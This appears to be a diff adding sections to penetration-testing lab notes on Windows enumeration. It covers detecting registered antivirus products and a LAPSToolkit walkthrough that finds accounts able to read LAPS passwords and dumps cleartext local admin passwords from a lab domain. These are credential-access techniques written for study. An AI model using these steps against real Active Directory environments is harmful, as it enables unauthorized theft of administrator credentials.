@@ -4914,6 +4914,55 @@ PSComputerName                  :
 </tr>
 </table>
 
+> **NOTE:** If `Get-MpComputerStatus` returns False or Not running across the board, do not assume the host is unprotected.
+
+Windows 10/11 automatically disables the built-in Defender engine (passing it to a dormant state) when a third-party Antivirus (e.g., Malwarebytes, Kaspersky) or an EDR (e.g., CrowdStrike) is installed and registered with the Windows Security Center to prevent kernel-level conflicts.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+displayName              : Malwarebytes
+instanceGuid             : {A537353A-1D6A-F6B5-9153-CE1CF80FBE66}
+pathToSignedProductExe   : C:\Program Files\Malwarebytes\Anti-Malware\MBAMWsc.exe
+pathToSignedReportingExe : C:\Program Files\Malwarebytes\Anti-Malware\MBAMWsc.exe
+productState             : 397312
+timestamp                : Fri, 27 Mar 2026 00:43:32 GMT
+PSComputerName           :
+
+displayName              : Windows Defender
+instanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
+pathToSignedProductExe   : windowsdefender://
+pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
+productState             : 393472
+timestamp                : Fri, 27 Mar 2026 00:43:45 GMT
+PSComputerName           :
+```
+
+</td>
+</tr>
+</table>
+
 </details>
 
 <details>
@@ -5049,6 +5098,153 @@ ConstrainedLanguage
 
 <details>
 <summary><h3>LAPS</h3></summary>
+
+**LAPS** is Microsoft's defense against Local Admin Pass-the-Hash attacks. It randomizes, rotates, and stores the local administrator password for every machine inside Active Directory. 
+
+However, because these passwords are stored as attributes in AD, *someone* needs permission to read them. Our goal is to find out **who** has those read permissions.
+
+**🎯 The Exploit Vector: "All Extended Rights"**
+
+Usually, only highly protected groups (like `Domain Admins` or `LAPS Admins`) can read LAPS passwords. 
+**The Misconfiguration:** When a standard user joins a computer to the domain, they are often granted **"All Extended Rights"** over that specific computer object. This right implicitly allows them to read the LAPS password. Since standard users are much easier to compromise than Domain Admins, they become our primary targets.
+
+We can use the PowerShell `LAPSToolkit` to map out the LAPS deployment and hunt for vulnerable delegations.
+
+**1. Map Delegated Groups per OU**
+
+Use `Find-LAPSDelegatedGroups` to see which groups are officially allowed to read passwords across different Organizational Units.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Find-LAPSDelegatedGroups
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+OrgUnit                                             Delegated Groups
+-------                                             ----------------
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+```
+
+</td>
+</tr>
+</table>
+
+**2. Hunt for "All Extended Rights" (The Weak Link)**
+
+Use `Find-AdmPwdExtendedRights` to check the specific rights on each LAPS-enabled computer. We are looking for any non-admin user listed here, as they are our easiest path to a local admin password.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Find-AdmPwdExtendedRights
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+ComputerName                Identity                    Reason
+------------                --------                    ------
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
+```
+
+</td>
+</tr>
+</table>
+
+**3. Dump the Passwords**
+
+If the user account we currently control has the proper delegated rights (or "All Extended Rights"), we can use `Get-LAPSComputers` to dump the cleartext passwords and their expiration dates directly from AD.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows VM - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Get-LAPSComputers
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```
+ComputerName                Password       Expiration
+------------                --------       ----------
+DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
+EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
+SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
+WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
+```
+
+</td>
+</tr>
+</table>
 
 </details>
 
